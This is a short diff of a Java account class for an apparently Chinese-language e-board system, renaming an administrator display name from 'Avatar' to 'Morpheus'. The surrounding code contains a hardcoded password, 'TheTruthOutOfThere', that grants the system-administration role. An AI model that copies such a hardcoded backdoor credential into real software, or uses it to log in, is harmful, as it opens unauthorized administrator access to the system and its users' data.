@@ -80,7 +80,7 @@ public class Accnt_EBoard extends JdbcConn07
     {
       if (passwd.equals("TheTruthOutOfThere"))
       {
-        this._sName = "Avatar";
+        this._sName = "Morpheus";
         this._sDept = "系統設計";
         this._iRoleCode = 1;
         this._sRoleName = "系統管理";
